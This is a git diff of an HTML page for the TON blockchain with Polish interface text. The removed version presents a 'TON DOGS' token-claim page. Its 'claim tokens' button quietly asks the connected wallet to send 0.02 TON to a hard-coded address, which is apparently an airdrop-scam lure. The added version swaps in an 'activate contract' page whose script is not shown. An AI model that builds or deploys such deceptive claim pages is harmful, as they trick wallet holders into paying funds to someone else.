@@ -1,127 +1,18 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON DOGS Token Transfer</title>
-    <script src="https://unpkg.com/@tonconnect/ui@2.0.0/dist/tonconnect-ui.min.js"></script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-        }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-        }
-        button {
-            margin: 10px;
-            padding: 12px 24px;
-            border: none;
-            border-radius: 8px;
-            background-color: #0088CC;
-            color: white;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        button:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
-        }
-        .token-info {
-            margin: 20px;
-            padding: 20px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            display: none;
-        }
-        #ton-connect {
-            display: flex;
-            justify-content: center;
-            margin: 20px 0;
-        }
-    </style>
+    <title>TON Connect Example</title>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 </head>
+
 <body>
-    <div class="container">
-        <h1>TON DOGS Token Transfer</h1>
-        <div id="ton-connect"></div>
-        <button id="connect-button">Połącz portfel</button>
-        <div class="token-info" id="token-info">
-            <h2>Informacje o tokenach</h2>
-            <p>Nazwa: DOGS Token</p>
-            <p>Ilość do otrzymania: <span id="token-amount">100</span> DOGS</p>
-            <button id="claim-button" disabled>Odbierz tokeny</button>
-        </div>
-    </div>
-    <script>
-        // Manifest URL - ZMIEŃ NA SWÓJ
-        const MANIFEST_URL = 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json';
-
-        // Inicjalizacja TON Connect UI
-        const tonConnectUI = new TONConnectUI({
-            manifestUrl: MANIFEST_URL,
-            buttonRootId: 'ton-connect'
-        });
-
-        // Elementy DOM
-        const connectButton = document.getElementById('connect-button');
-        const claimButton = document.getElementById('claim-button');
-        const tokenInfo = document.getElementById('token-info');
-
-        // Nasłuchiwanie zdarzeń połączenia
-        tonConnectUI.onStatusChange(wallet => {
-            if (wallet) {
-                console.log('Wallet connected:', wallet);
-                connectButton.style.display = 'none';
-                tokenInfo.style.display = 'block';
-                claimButton.disabled = false;
-            } else {
-                console.log('Wallet disconnected');
-                connectButton.style.display = 'block';
-                tokenInfo.style.display = 'none';
-                claimButton.disabled = true;
-            }
-        });
-
-        // Ręczne połączenie portfela
-        connectButton.addEventListener('click', async () => {
-            try {
-                await tonConnectUI.connectWallet();
-            } catch (error) {
-                console.error('Błąd połączenia:', error);
-                alert('Nie udało się połączyć z portfelem');
-            }
-        });
-
-        // Funkcja do tworzenia transakcji
-        async function createTokenTransfer() {
-            try {
-                // Przykładowa transakcja
-                const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 360,
-                    messages: [
-                        {
-                            address: 'EQDcwc2whoTvG3Q81iztMKE1CHLZZdXGXgth2mxJ1cNmGgTi', // ZMIEŃ NA ADRES KONTRAKTU
-                            amount: '20000000', // 0.02 TON
-                            payload: '' // Dodaj payload jeśli potrzeba
-                        }
-                    ]
-                };
-
-                // Wysłanie transakcji
-                const result = await tonConnectUI.sendTransaction(transaction);
-                console.log('Transakcja wysłana:', result);
-                alert('Transakcja została wysłana!');
-            } catch (error) {
-                console.error('Błąd transakcji:', error);
-                alert('Wystąpił błąd podczas wysyłania transakcji');
-            }
-        }
-
-        // Obsługa przycisku odbioru tokenów
-        claimButton.addEventListener('click', createTokenTransfer);
-    </script>
+    <h1>Aktywuj kontrakt</h1>
+    <div id="ton-connect"></div> <button id="connect-button">Połącz portfel</button> <button id="activate-button"
+        disabled>Aktywuj kontrakt</button>
+    <script src="script.js"></script>
 </body>
+
 </html>
